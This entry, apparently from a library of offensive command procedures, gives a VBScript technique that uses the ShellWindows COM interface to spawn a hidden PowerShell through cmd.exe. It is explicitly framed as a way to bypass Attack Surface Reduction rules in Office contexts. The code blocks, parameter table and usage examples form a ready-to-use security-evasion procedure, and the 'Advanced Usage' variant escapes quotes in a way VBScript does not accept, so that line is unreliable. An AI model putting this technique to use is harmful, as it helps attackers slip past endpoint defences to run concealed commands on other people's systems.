---
id: 2f70dfbb-ac45-47ee-b814-8e99496e33e0
name: Launch-PowerShell-via-ShellExecute-VBS
type: command
executor: vbscript
data: >-
  Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"

  Set SW = GetObject("new:" & ShellWindows).Item()

  SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe",
  "C:\Windows\System32", Null, 0
output: null
created_at: '2023-04-06T03:56:23.581507+00:00'
updated_at: '2023-04-10T20:36:53.437030+00:00'
platforms:
  - Windows
tags:
  - asr-bypass
  - powershell-launch
verified: true
validated: true
---

# Launch-PowerShell-via-ShellExecute-VBS

## Command

```vbscript
Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
Set SW = GetObject("new:" & ShellWindows).Item()
SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
```

## Description

This VBScript command uses the ShellWindows COM interface to indirectly launch PowerShell via cmd.exe, bypassing direct execution restrictions like ASR Rule 5 in Office contexts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ShellWindows GUID | Fixed COM GUID for ShellWindows object | Yes (built-in) |
| cmd.exe | Path to cmd.exe (inferred from working directory) | Yes |
| /c powershell.exe | Command to execute PowerShell and close cmd | Yes |
| C:\Windows\System32 | Working directory for execution | Yes |
| Null | Parameters for ShellExecute (none) | Yes |
| 0 | Window style (0 = hidden) | Yes |

## Examples

### Basic Usage

Save as .vbs and run: Opens hidden PowerShell session.

```vbscript
Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
Set SW = GetObject("new:" & ShellWindows).Item()
SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
```

### Advanced Usage

Modify to run a specific PowerShell command:

```vbscript
SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe -Command \"Get-Process\"", "C:\Windows\System32", Null, 0
```

## Expected Output

No console output if hidden (window style 0); PowerShell process spawns in task manager. Successful execution shows powershell.exe running under cmd.exe parent process.

## Related

- [[procedures/Bypass-ASR-Rule-5-via-WMI-to-Execute-PowerShell]]
